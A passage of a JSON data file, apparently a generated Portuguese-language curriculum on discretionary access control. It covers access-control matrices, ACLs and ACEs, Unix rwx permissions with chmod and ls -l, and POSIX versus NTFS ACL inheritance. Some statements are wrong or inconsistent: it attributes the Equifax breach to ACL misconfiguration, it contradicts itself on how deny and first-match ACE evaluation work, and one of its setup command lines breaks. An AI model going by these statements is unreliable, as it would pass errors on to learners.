                                    "Refletir: como isso se aplica em ambientes corporativos."
                                  ],
                                  "verification": "Executar simulação em VM e documentar resultados com screenshots.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "Máquina virtual com Ubuntu",
                                    "Comandos: touch, chown, chmod, ls -l",
                                    "Ferramenta de screenshot"
                                  ],
                                  "tips": "Teste sempre com contas de usuário diferentes para validar.",
                                  "learningObjective": "Aplicar o papel do proprietário em prática e identificar falhas comuns.",
                                  "commonMistakes": [
                                    "Esquecer de testar revogação",
                                    "Não diferenciar root de proprietário comum"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um sistema Linux, João cria um arquivo 'relatorio.confidencial'. Como proprietário, ele executa 'chmod 600 relatorio.confidencial' para permitir apenas leitura/escrita por si mesmo, revoga acesso de Maria com 'chmod 000', e depois transfere propriedade com 'chown maria relatorio.confidencial', demonstrando autoridade total.",
                              "finalVerifications": [
                                "Explicar em palavras próprias o papel do proprietário no DAC.",
                                "Identificar 3 ações exclusivas do proprietário e dar exemplos.",
                                "Diferenciar DAC de MAC em um parágrafo curto.",
                                "Simular um cenário onde o proprietário revoga acesso e verificar resultado.",
                                "Criar diagrama mostrando fluxo de autoridade no DAC.",
                                "Responder quiz com 5 perguntas sobre o tema com 100% acerto."
                              ],
                              "assessmentCriteria": [
                                "Precisão conceitual: definições corretas sem confusões com outros modelos.",
                                "Completude: Cobertura de todas as autoridades (definir, modificar, revogar).",
                                "Diferenciação clara: Comparação explícita com MAC.",
                                "Aplicação prática: Exemplos reais e simulados funcionais.",
                                "Profundidade: Inclusão de limitações e cenários edge-case.",
                                "Clareza de expressão: Resumos e diagramas legíveis e lógicos."
                              ],
                              "crossCurricularConnections": [
                                "Direito Digital: Conceitos de propriedade intelectual e direitos de acesso.",
                                "Administração de Sistemas: Gerenciamento de usuários e grupos em SO.",
                                "Ética em Cibersegurança: Responsabilidades do proprietário em compliance.",
                                "Gestão de Projetos: Controle de acesso em ferramentas colaborativas como Git.",
                                "Redes: Integração com ACLs em roteadores e firewalls."
                              ],
                              "realWorldApplication": "Em ambientes corporativos como bancos ou hospitais, o proprietário de um arquivo sensível (ex: relatório financeiro no Windows NTFS) define acessos granulares para equipes, revogando quando funcionários saem, prevenindo vazamentos e garantindo conformidade com LGPD ou GDPR, ao contrário de MAC usado em sistemas militares de alta segurança."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.6.4.1.3",
                            "name": "Explicar matriz de controle de acesso no DAC",
                            "description": "Representar o DAC através de uma matriz onde linhas são sujeitos e colunas são objetos, com entradas definindo permissões como allow/deny.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender os Componentes Fundamentais da Matriz DAC",
                                  "subSteps": [
                                    "Defina sujeito como entidade ativa (usuário ou processo) que solicita acesso.",
                                    "Defina objeto como entidade passiva (arquivo, recurso) a ser acessado.",
                                    "Explique permissões como entradas na matriz: 'allow' para conceder, 'deny' para negar.",
                                    "Descreva a estrutura: linhas = sujeitos, colunas = objetos.",
                                    "Identifique tipos comuns de permissões: read (R), write (W), execute (X)."
                                  ],
                                  "verification": "Crie um diagrama simples identificando linhas, colunas e uma entrada de permissão.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Papel e caneta ou ferramenta de desenho como Draw.io",
                                    "Documentação de DAC básica"
                                  ],
                                  "tips": "Use cores diferentes para sujeitos e objetos para visualizar melhor.",
                                  "learningObjective": "Compreender os elementos básicos que compõem a matriz de controle de acesso DAC.",
                                  "commonMistakes": [
                                    "Confundir sujeitos com objetos",
                                    "Ignorar que permissões podem ser granulares (R/W/X)",
                                    "Assumir que matriz é sempre quadrada"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Construir uma Matriz de Controle de Acesso Simples",
                                  "subSteps": [
                                    "Liste 3 sujeitos (ex: UserA, UserB, Admin).",
                                    "Liste 3 objetos (ex: File1.txt, File2.exe, Database.db).",
                                    "Preencha a matriz: para cada interseção, defina 'allow R/W' ou 'deny'.",
                                    "Garanta consistência: Admin permite tudo, UserA só lê File1.",
                                    "Desenhe a matriz em formato tabular."
                                  ],
                                  "verification": "A matriz deve ter todas as interseções preenchidas sem ambiguidades.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Planilha Excel ou Google Sheets",
                                    "Exemplos de matrizes DAC impressos"
                                  ],
                                  "tips": "Comece com uma matriz pequena para evitar sobrecarga cognitiva.",
                                  "learningObjective": "Capacitar a criação manual de uma matriz DAC funcional.",
                                  "commonMistakes": [
                                    "Deixar células vazias (assume deny por padrão?)",
                                    "Não diferenciar permissões granulares",
                                    "Confundir allow com herança de permissões"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Interpretar e Analisar Permissões na Matriz",
                                  "subSteps": [
                                    "Para um sujeito específico, trace a linha e liste objetos acessíveis.",
                                    "Simule uma solicitação: UserA quer escrever em File2? Verifique a célula.",
                                    "Identifique padrões: permissões amplas vs. restritas.",
                                    "Discuta impactos de mudanças: alterar uma célula afeta apenas aquela interseção.",
                                    "Compare com lista de controle de acesso (ACL) verbal."
                                  ],
                                  "verification": "Responda corretamente a 5 consultas de acesso baseadas na sua matriz.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Matriz construída no Step 2",
                                    "Simulador online de DAC se disponível"
                                  ],
                                  "tips": "Use setas para rastrear acessos durante a simulação.",
                                  "learningObjective": "Desenvolver habilidade em ler e interpretar matrizes DAC para decisões de acesso.",
                                  "commonMistakes": [
                                    "Interpretar deny como parcial",
                                    "Ignorar contexto de herança em sistemas reais",
                                    "Confundir matriz com modelo de lista"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Aplicar e Validar a Matriz em Cenários Práticos",
                                  "subSteps": [
                                    "Crie um cenário: empresa com usuários e arquivos sensíveis.",
                                    "Ajuste a matriz para compliance (ex: least privilege).",
                                    "Teste edge cases: acesso negado explícito vs. implícito.",
                                    "Documente regras derivadas da matriz.",
                                    "Avalie escalabilidade para mais sujeitos/objetos."
                                  ],
                                  "verification": "A matriz resolve o cenário sem violações de segurança.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Cenário fictício impresso",
                                    "Ferramenta de modelagem como Lucidchart"
                                  ],
                                  "tips": "Priorize princípio de menor privilégio em todas as entradas.",
                                  "learningObjective": "Aplicar matriz DAC a contextos reais e validar sua efetividade.",
                                  "commonMistakes": [
                                    "Sobrecarregar Admin com todos allows",
                                    "Não considerar escalabilidade",
                                    "Misturar DAC com MAC"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um sistema de arquivos Unix-like, crie uma matriz para usuários Alice, Bob e Root com arquivos report.pdf (R/W), payroll.xlsx (R apenas para Root). Matriz: Alice-File1=allow R; Alice-File2=deny; Bob-File1=deny; etc. Simule Alice tentando editar payroll.xlsx: célula indica deny.",
                              "finalVerifications": [
                                "Construir corretamente uma matriz 3x3 com permissões granulares.",
                                "Interpretar acesso para qualquer sujeito-objeto sem erros.",
                                "Explicar diferença entre allow/deny em pelo menos 2 cenários.",
                                "Identificar violações de least privilege na matriz de outro.",
                                "Desenhar matriz para 5 sujeitos/objetos em <5 min.",
                                "Comparar matriz DAC com ACL textual."
                              ],
                              "assessmentCriteria": [
                                "Precisão na definição de componentes (sujeitos/objetos/permissões): 25%.",
                                "Qualidade da matriz construída (completude/consistência): 25%.",
                                "Habilidade de interpretação e simulação de acessos: 20%.",
                                "Aplicação a cenários reais e edge cases: 15%.",
                                "Clareza na documentação e explicação verbal: 15%."
                              ],
                              "crossCurricularConnections": [
                                "Programação: Implementar matriz como array 2D em Python para simulação DAC.",
                                "Administração de Sistemas: Mapear para comandos chmod/chown no Linux.",
                                "Banco de Dados: Relacionar com GRANT/REVOKE em SQL para controle de acesso.",
                                "Redes: Conectar com ACLs em firewalls/roteadores.",
                                "Ética em TI: Discutir privacidade e least privilege."
                              ],
                              "realWorldApplication": "No Windows NTFS, matriz DAC gerencia permissões de arquivos via ACLs matriciais; no Linux, reflete ownership e chmod (ex: drwxr-x---). Usado em empresas para proteger dados sensíveis, evitando acessos não autorizados em compartilhamentos de rede."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.6.4.2",
                        "name": "Mecanismos de Implementação do DAC",
                        "description": "Explorar como o DAC é implementado em sistemas operacionais, incluindo listas de controle de acesso (ACLs) e bits de permissão.",
                        "specificSkills": [
                          {
                            "id": "10.1.6.4.2.1",
                            "name": "Descrever listas de controle de acesso (ACLs)",
                            "description": "Analisar ACLs como estruturas de dados que associam permissões específicas a usuários ou grupos em um objeto, permitindo controle granular.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os conceitos fundamentais das Listas de Controle de Acesso (ACLs)",
                                  "subSteps": [
                                    "Pesquise a definição de ACLs no contexto de Controle de Acesso Discrecional (DAC).",
                                    "Identifique a diferença entre ACLs e outros mecanismos como RBAC ou MAC.",
                                    "Analise o propósito das ACLs: associar permissões granulares a usuários ou grupos em objetos.",
                                    "Estude exemplos iniciais de objetos protegidos por ACLs, como arquivos e diretórios.",
                                    "Registre anotações sobre como ACLs promovem controle granular."
                                  ],
                                  "verification": "Escreva um resumo de 100 palavras explicando o que são ACLs e seu papel no DAC.",
                                  "estimatedTime": "25 minutos",
                                  "materials": "Documentação Microsoft NTFS ACLs (docs.microsoft.com), Wikipedia 'Access Control List', slides sobre DAC.",
                                  "tips": "Foquem em exemplos reais de sistemas operacionais como Windows ou Linux NFS para fixar o conceito.",
                                  "learningObjective": "Definir ACLs e diferenciar de outros modelos de controle de acesso.",
                                  "commonMistakes": "Confundir ACLs com listas de firewall ou regras de roteamento; ACLs são específicas para objetos de sistema de arquivos."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar a estrutura de dados de uma ACL",
                                  "subSteps": [
                                    "Desenhe um diagrama simples de uma ACL como uma lista ordenada de entradas.",
                                    "Identifique componentes principais: cabeçalho da ACL e entradas individuais (ACEs).",
                                    "Estude atributos como tipo de ACE (permitir/negado), flags de propagação e SID de usuários/grupos.",
                                    "Compare estruturas em diferentes SOs: NTFS vs. POSIX ACLs.",
                                    "Crie um exemplo fictício de ACL para um arquivo."
                                  ],
                                  "verification": "Desenhe e label um diagrama de ACL com pelo menos 3 ACEs.",
                                  "estimatedTime": "35 minutos",
                                  "materials": "Ferramenta de desenho como Draw.io, RFC 3530 para NFS ACLs, ferramenta icacls no Windows.",
                                  "tips": "Use SIDs (Security Identifiers) para representar usuários; memorize a ordem de avaliação das ACEs.",
                                  "learningObjective": "Representar visualmente a estrutura de uma ACL como array de ACEs.",
                                  "commonMistakes": "Ignorar a ordem das ACEs; a primeira correspondência define a permissão."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explorar as Entradas de Controle de Acesso (ACEs)",
                                  "subSteps": [
                                    "Detalhe os campos de uma ACE: tipo (allow/deny), SID, máscara de permissões (read/write/execute).",
                                    "Classifique permissões comuns: FULL_CONTROL, READ, WRITE, DELETE.",
                                    "Analise flags como OBJECT_INHERIT_ACE e INHERIT_ONLY_ACE.",
                                    "Simule cenários onde deny prevalece sobre allow.",
                                    "Liste permissões padrão em um sistema Windows."
                                  ],
                                  "verification": "Liste 5 tipos de ACEs com exemplos de máscaras de permissões binárias.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "Comando 'icacls' ou 'getfacl' em terminal, tabela de permissões NTFS.",
                                  "tips": "Lembre-se: Deny sempre tem precedência; teste em VM para ver na prática.",
                                  "learningObjective": "Descrever componentes e comportamentos de ACEs em ACLs.",
                                  "commonMistakes": "Esquecer que herança afeta subobjetos; propagação deve ser configurada corretamente."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Descrever o processo de avaliação e aplicação de ACLs",
                                  "subSteps": [
                                    "Explique o algoritmo de avaliação: percorrer ACEs em ordem até match de SID.",
                                    "Simule avaliação para um usuário com múltiplos grupos.",
                                    "Discuta impacto de ACLs em performance e auditoria.",
                                    "Compare com Owner/Group/Other no modelo Unix simples.",
                                    "Crie um fluxograma do processo de verificação de permissões."
                                  ],
                                  "verification": "Simule e documente a avaliação de uma ACL para 2 cenários de usuário diferentes.",
                                  "estimatedTime": "40 minutos",
                                  "materials": "VM com Windows/Linux, fluxograma tool como Lucidchart, logs de auditoria SACL.",
                                  "tips": "Sempre considere o contexto de efetivas permissões (effective permissions).",
                                  "learningObjective": "Explicar passo a passo como o SO usa ACLs para conceder/negá permissões.",
                                  "commonMistakes": "Assumir que allow sempre vence; deny é avaliado primeiro em alguns SOs."
                                }
                              ],
                              "practicalExample": "Em um servidor Windows compartilhado, configure a ACL de um arquivo 'dados_confidenciais.docx': Adicione ACE allow READ para grupo 'Funcionários', deny WRITE para 'Estagiários', e FULL_CONTROL para 'Admin'. Teste acessando com contas diferentes via Explorer ou icacls, observando herança em subpastas.",
                              "finalVerifications": [
                                "Explicar verbalmente a estrutura de uma ACL com diagrama.",
                                "Simular avaliação de permissões para um usuário em grupo misto.",
                                "Identificar e corrigir uma ACL mal configurada em exemplo dado.",
                                "Diferenciar ACE allow de deny com exemplos reais.",
                                "Descrever impacto de flags de herança em um diretório.",
                                "Listar 3 vantagens das ACLs sobre permissões básicas."
                              ],
                              "assessmentCriteria": [
                                "Precisão na descrição da estrutura ACL/ACE (80% dos componentes corretos).",
                                "Correta simulação de avaliação de permissões em cenários (sem erros lógicos).",
                                "Uso apropriado de terminologia técnica (SID, máscara, herança).",
                                "Criatividade e relevância no diagrama/fluxograma.",
                                "Identificação de erros comuns em configurações ACL.",
                                "Conexão clara com conceitos de DAC."
                              ],
                              "crossCurricularConnections": [
                                "Programação: ACLs como estruturas de dados (arrays de objetos com chaves SID-permissão).",
                                "Redes: Similar a regras de ACL em roteadores Cisco (listas ordenadas).",
                                "Banco de Dados: Controle de acesso em SQL GRANT/REVOKE granulares.",
                                "Direito Digital: Analogia com políticas de privacidade e GDPR."
                              ],
                              "realWorldApplication": "Em empresas, ACLs protegem arquivos sensíveis em servidores Active Directory, como relatórios financeiros acessíveis apenas a gerentes, prevenindo vazamentos de dados e garantindo conformidade com normas como LGPD."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.6.4.2.2",
                            "name": "Explicar bits de permissão em sistemas Unix-like",
                            "description": "Detalhar o modelo de permissões rwx (read, write, execute) para owner, group e others em sistemas como Linux, usando comandos como chmod e ls -l.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os tipos básicos de permissões rwx",
                                  "subSteps": [
                                    "Defina 'read (r)': permite visualizar o conteúdo de um arquivo ou listar diretórios.",
                                    "Defina 'write (w)': permite modificar ou deletar o conteúdo de um arquivo ou criar/renomear itens em diretórios.",
                                    "Defina 'execute (x)': permite executar um arquivo como programa/script ou acessar subdiretórios.",
                                    "Entenda que permissões são representadas por bits binários: 1 para concedido, 0 para negado.",
                                    "Memorize a representação simbólica: r=4, w=2, x=1 em octal (ex: rwx=7)."
                                  ],
                                  "verification": "Liste e explique corretamente os significados de r, w, x em um arquivo de notas.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Terminal Linux (ex: Ubuntu)",
                                    "Editor de texto (nano/vim)"
                                  ],
                                  "tips": [
                                    "Use mnemônicos: Read=olhar, Write=escrever, eXecute=executar.",
                                    "Pratique convertendo octal para simbólico: 7=rwx, 6=rw-, 5=r-x."
                                  ],
                                  "learningObjective": "Identificar e explicar o propósito de cada permissão rwx.",
                                  "commonMistakes": [
                                    "Confundir 'execute' com 'read' em diretórios.",
                                    "Ignorar que 'x' em diretórios permite traversal.",
                                    "Esquecer representação octal (r=4, w=2, x=1)."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Entender a estrutura de permissões: Owner, Group e Others",
                                  "subSteps": [
                                    "Identifique 'owner (u/user)': proprietário do arquivo.",
                                    "Identifique 'group (g/group)': grupo associado ao proprietário.",
                                    "Identifique 'others (o/other)': todos os demais usuários.",
                                    "Visualize a notação: [ugo][rwx][rwx][rwx] ou 10 caracteres após '-', ex: -rwxr-xr-x.",
                                    "Aprenda a usar ls -l para ver owner:group e permissões."
                                  ],
                                  "verification": "Execute ls -l em um arquivo e identifique corretamente owner, group e others.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Terminal Linux",
                                    "Diretório com arquivos de teste (crie touch testfile)"
                                  ],
                                  "tips": [
                                    "Lembre: posições 1-3=owner, 4-6=group, 7-9=others.",
                                    "Use id -u e id -g para ver seu user/group."
                                  ],
                                  "learningObjective": "Mapear a estrutura de 9 bits de permissão para ugo.",
                                  "commonMistakes": [
                                    "Confundir owner com group.",
                                    "Ignorar o primeiro caractere ('-' para file, 'd' para dir).",
                                    "Não notar sticky bits ou setuid (ex: s em vez de x)."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Interpretar permissões com o comando ls -l",
                                  "subSteps": [
                                    "Execute ls -l em um diretório para ver saída detalhada.",
                                    "Decodifique uma linha exemplo: -rw-r--r-- 1 user group 1024 date filename.",
                                    "Pratique com vários arquivos: identifique quem pode ler/escrever/executar.",
                                    "Diferencie arquivos (-) de diretórios (d) e links (l).",
                                    "Use ls -la para ver arquivos ocultos."
                                  ],
                                  "verification": "Capture screenshot ou anote decodificação correta de 3 arquivos diferentes.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Terminal Linux",
                                    "Vários arquivos criados: touch file1 file2 dir1; mkdir dir1"
                                  ],
                                  "tips": [
                                    "Foque nos 10 caracteres iniciais: tipo + 3 grupos de 3.",
                                    "Pratique verbalizando: 'Owner pode rw, group r, others r'."
                                  ],
                                  "learningObjective": "Ler e interpretar corretamente a saída de ls -l.",
                                  "commonMistakes": [
                                    "Ler apenas owner e ignorar group/others.",
                                    "Confundir permissões de diretório vs arquivo.",
                                    "Não executar ls -l em diretórios para ver 'x' traversal."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Modificar permissões com chmod (simbólico e octal)",
                                  "subSteps": [
                                    "Aprenda modo simbólico: chmod u+x file (adiciona x para user).",
                                    "Use operadores: + (adicionar), - (remover), = (definir), ex: chmod ugo=rw file.",
                                    "Aprenda modo octal: chmod 755 file (rwxr-xr-x).",
                                    "Pratique: chmod 600 secret.txt (rw-------), chmod 644 public.txt (rw-r--r--).",
                                    "Verifique sempre com ls -l após mudança."
                                  ],
                                  "verification": "Altere permissões de 3 arquivos e confirme com ls -l sem erros.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Terminal Linux",
                                    "Arquivos de teste: touch secret.txt public.txt script.sh"
                                  ],
                                  "tips": [
                                    "Octal é rápido: 755=dir padrão, 644=file padrão, 600=sensível.",
                                    "Teste como outro user com su - otheruser."
                                  ],
                                  "learningObjective": "Aplicar chmod corretamente em ambos modos.",
                                  "commonMistakes": [
                                    "Usar octal com letras (ex: chmod rwxrwxrwx inválido).",
                                    "Esquecer de verificar com ls -l.",
                                    "Alterar recursivamente (-R) sem cuidado em /."
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Aplicar conceitos em cenários de segurança",
                                  "subSteps": [
                                    "Crie um script executável: chmod +x myscript.sh.",
                                    "Proteja um arquivo sensível: chmod 600 private.key.",
                                    "Configure diretório compartilhado: chmod 755 shared_dir; chmod 644 shared_dir/*.",
                                    "Teste negações: tente cat arquivo sem r, cd dir sem x.",
                                    "Discuta impactos em DAC: permissões definem acesso discrecional."
                                  ],
                                  "verification": "Demonstre cenários funcionais e falhas esperadas em log.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Terminal Linux",
                                    "Script simples: echo '#!/bin/bash\necho Hello' > myscript.sh"
                                  ],
                                  "tips": [
                                    "Sempre chown se mudar owner: chown user:group file.",
                                    "Use umask para defaults (umask 022)."
                                  ],
                                  "learningObjective": "Integrar permissões em práticas de segurança Unix.",
                                  "commonMistakes": [
                                    "Executar chmod 777 (inseguro).",
                                    "Ignorar group membership com groups command.",
                                    "Não testar como 'others'."
                                  ]
                                }
                              ],
                              "practicalExample": "Crie um arquivo 'config.conf' com touch. Defina chmod 600 config.conf (apenas owner rw). Verifique com ls -l. Como outro usuário (su - guest), tente cat config.conf (deve falhar). Altere para chmod 644 e teste novamente (sucesso para read). Crie dir 'secure/' com chmod 700 e teste cd como guest (falha).",
                              "finalVerifications": [
                                "Explicar o que -rwxr-xr-x significa em termos de ugo rwx.",
                                "Converter 755 octal para simbólico e vice-versa.",
                                "Interpretar ls -l de um arquivo arbitrário corretamente.",
                                "Aplicar chmod 640 a um arquivo e verificar acesso restrito.",
                                "Identificar por que um diretório precisa de 'x' para acesso.",
                                "Discutir risco de 777 em contexto de cibersegurança."
                              ],
                              "assessmentCriteria": [
                                "Precisão na decodificação de permissões (100% correto).",
                                "Uso correto de chmod simbólico e octal sem erros de sintaxe.",
                                "Demonstração de verificações com ls -l após cada mudança.",
                                "Compreensão de impactos em DAC e segurança.",
                                "Identificação de erros comuns e correções.",
                                "Aplicação em exemplo prático sem falhas de acesso."
                              ],
                              "crossCurricularConnections": [
                                "Administração de Sistemas: Integra com users/groups/chown.",
                                "Programação Shell: Scripts precisam de +x para execução.",
                                "Redes e Servidores: Permissões em /var/www para web servers.",
                                "Direito Digital: Compliance com privacidade (ex: GDPR file access).",
                                "Criptografia: Proteger chaves privadas com 600."
                              ],
                              "realWorldApplication": "Em servidores Linux (ex: AWS EC2), configure /etc/shadow com 000 (imutável), chaves SSH com 600 para prevenir roubo, diretórios web com 755/644 para evitar exploits como directory traversal em ciberataques."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.6.4.2.3",
                            "name": "Diferenciar ACLs tradicionais de ACLs estendidas",
                            "description": "Comparar ACLs POSIX.1e com NTFS ACLs no Windows, destacando herança de permissões e propagação em hierarquias de diretórios.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender ACLs Tradicionais POSIX.1e",
                                  "subSteps": [
                                    "Pesquise a especificação POSIX.1e e identifique que ACLs POSIX são extensões opcionais ao modelo de permissões básicas (user/group/other).",
                                    "Analise como ACLs POSIX usam entradas de ACL com tags como USER_OBJ, GROUP_OBJ, OTHER_OBJ, USER, GROUP e MASK.",
                                    "Estude limitações: sem suporte nativo a herança avançada; permissões aplicadas estritamente ao objeto sem propagação automática.",
                                    "Pratique listando ACLs POSIX com comandos como getfacl em um sistema Linux.",
                                    "Compare com permissões básicas octais (rwxrwxrwx) para ver como ACLs POSIX as estendem."
                                  ],
                                  "verification": "Execute 'getfacl /caminho/arquivo' e explique as entradas de ACL em um relatório curto.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Sistema Linux com ACLs ativadas (setfacl/getfacl)",
                                    "Documentação POSIX.1e online",
                                    "Editor de texto para anotações"
                                  ],
                                  "tips": "Ative ACLs no filesystem com 'mount -o acl' se necessário para testes práticos.",
                                  "learningObjective": "Identificar e descrever componentes básicos das ACLs POSIX.1e e suas limitações em herança.",
                                  "commonMistakes": [
                                    "Confundir ACLs POSIX com permissões básicas octais",
                                    "Ignorar a necessidade de suporte no kernel/filesystem"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explorar ACLs Estendidas NTFS no Windows",
                                  "subSteps": [
                                    "Acesse a documentação Microsoft sobre NTFS ACLs e note que incluem DACL (Discretionary ACL) e SACL (System ACL).",
                                    "Identifique tipos de ACEs: Allow/Deny, com flags como OBJECT_INHERIT_ACE e CONTAINER_INHERIT_ACE para herança.",
                                    "Aprenda sobre propagação: permissões herdam para subdiretórios e arquivos com opções como 'Apply to this folder, subfolders and files'.",
                                    "Use icacls ou Explorer para visualizar e modificar ACLs em uma pasta Windows.",
                                    "Diferencie propagação explícita de POSIX, onde herança requer configuração manual via flags."
                                  ],
                                  "verification": "Use 'icacls C:\\teste' antes/depois de alterações e capture screenshot com explicação das heranças.",
                                  "estimatedTime": "50 minutos",
                                  "materials": [
                                    "Máquina Windows com NTFS",
                                    "Comando icacls ou PowerShell Get-Acl",
                                    "Documentação MSDN NTFS Security"
                                  ],
                                  "tips": "Crie uma pasta de teste e aplique permissões deny para ver propagação em ação.",
                                  "learningObjective": "Descrever estrutura de ACLs NTFS, focando em herança e flags de propagação.",
                                  "commonMistakes": [
                                    "Confundir DACL com SACL",
                                    "Não testar herança em subitens para validar propagação"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Comparar Diferenças Chave entre POSIX.1e e NTFS ACLs",
                                  "subSteps": [
                                    "Crie uma tabela comparativa: POSIX (simples, sem herança nativa) vs NTFS (complexa, com herança/propagação).",
                                    "Destaque granularidade: POSIX limitado a usuários/grupos vs NTFS com SIDs detalhados e auditing.",
                                    "Analise herança: POSIX requer setfacl recursivo manual vs NTFS automático via inheritance flags.",
                                    "Discuta propagação em hierarquias: POSIX não propaga automaticamente vs NTFS com proteção de herança.",
                                    "Teste cenários idênticos em ambos OS: criar pasta pai/filho e aplicar permissões."
                                  ],
                                  "verification": "Produza tabela Markdown/PDF comparando 5 diferenças chave, incluindo exemplos de comandos.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "Planilha ou editor Markdown",
                                    "Ambientes Linux/Windows virtuais",
                                    "Ferramentas de screenshot"
                                  ],
                                  "tips": "Use VMs para testes paralelos e evite alterar arquivos reais do sistema.",
                                  "learningObjective": "Comparar e contrastar mecanismos de ACLs POSIX vs NTFS em termos de funcionalidade e herança.",
                                  "commonMistakes": [
                                    "Superficialidade na comparação sem exemplos práticos",
                                    "Ignorar contexto POSIX opcional vs NTFS padrão"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Aplicar Conhecimento em Cenários de Hierarquia de Diretórios",
                                  "subSteps": [
                                    "Simule hierarquia: crie /pasta/pai/filho em Linux e C:\\pasta\\pai\\filho em Windows.",
                                    "Aplique permissões no pai e observe propagação: manual em POSIX vs flags em NTFS.",
                                    "Teste cenários de deny: como um deny no pai afeta filhos em cada sistema.",
                                    "Documente diferenças em relatórios: impacto na administração de segurança.",
                                    "Discuta melhores práticas para migração cross-platform."
                                  ],
                                  "verification": "Registre logs de comandos/screenshots mostrando herança/propagação em ambos sistemas.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "VMs Linux/Windows",
                                    "Comandos setfacl/icacls",
                                    "Ferramenta de documentação como Notion"
                                  ],
                                  "tips": "Use 'setfacl -R' com cuidado em POSIX para simular recursão.",
                                  "learningObjective": "Demonstrar e analisar herança/propagação de permissões em hierarquias reais.",
                                  "commonMistakes": [
                                    "Não criar hierarquia profunda o suficiente",
                                    "Esquecer de testar deny explicit vs inherited"
                                  ]
                                }
                              ],
                              "practicalExample": "Em uma empresa com servidores Linux e Windows compartilhados, um admin aplica 'read-only' na pasta /dados/ no Linux usando setfacl (manual para subpastas), mas no Windows C:\\dados\\ usa 'Advanced Security' com 'This folder, subfolders and files' para herança automática, evitando erros de propagação em relatórios sensíveis.",
                              "finalVerifications": [
                                "Explique verbalmente 3 diferenças principais entre POSIX e NTFS ACLs.",
                                "Demonstre configuração de herança em ambos OS com exemplos ao vivo.",
                                "Crie tabela comparativa precisa sem erros factuais.",
                                "Identifique quando usar cada tipo em cenários híbridos.",
                                "Resolva um quiz com 5 perguntas sobre propagação/herança."
                              ],
                              "assessmentCriteria": [
                                "Precisão na descrição de componentes ACL (POSIX tags vs NTFS ACEs/flags).",
                                "Profundidade na análise de herança/propagação com exemplos práticos.",
                                "Capacidade de criar comparações claras e tabelas estruturadas.",
                                "Demonstração hands-on sem erros em comandos/ferramentas.",
                                "Integração de limitações e melhores práticas em respostas."
                              ],
                              "crossCurricularConnections": [
                                "Administração de Sistemas: Gerenciamento de usuários/grupos em SOs multi-plataforma.",
                                "Redes e Active Directory: Integração NTFS com domínios para SIDs globais.",
                                "Compliance e Auditoria: Uso de SACLs NTFS para logging vs ACLs POSIX básicas.",
                                "Desenvolvimento Seguro: Impacto em apps cross-platform como Docker volumes."
                              ],
                              "realWorldApplication": "Em ambientes empresariais híbridos (Linux/Windows), admins usam essa distinção para configurar shares seguros em NAS/SAN, garantindo que permissões se propaguem corretamente em árvores de diretórios de dados críticos, prevenindo vazamentos como no caso de Equifax breach por má configuração de ACLs."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.6.4.3",
                        "name": "Vantagens, Limitações e Comparações",
                        "description": "Avaliar os prós e contras do DAC em relação a outros modelos de controle de acesso e identificar vulnerabilidades comuns.",
                        "specificSkills": [
                          {
                            "id": "10.1.6.4.3.1",
                            "name": "Listar vantagens e desvantagens do DAC",
                            "description": "Discutir flexibilidade para proprietários versus riscos de concessão excessiva de permissões, como escalada de privilégios por erros humanos.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Revisar Conceitos Fundamentais do DAC",
                                  "subSteps": [
                                    "Defina DAC como um modelo onde o proprietário do objeto controla o acesso.",
                                    "Identifique componentes chave: sujeito, objeto, proprietário e ACL (Access Control List).",
                                    "Compare brevemente com MAC para contextualizar flexibilidade do DAC.",
                                    "Anote princípios como 'owner discretion' e herança de permissões.",
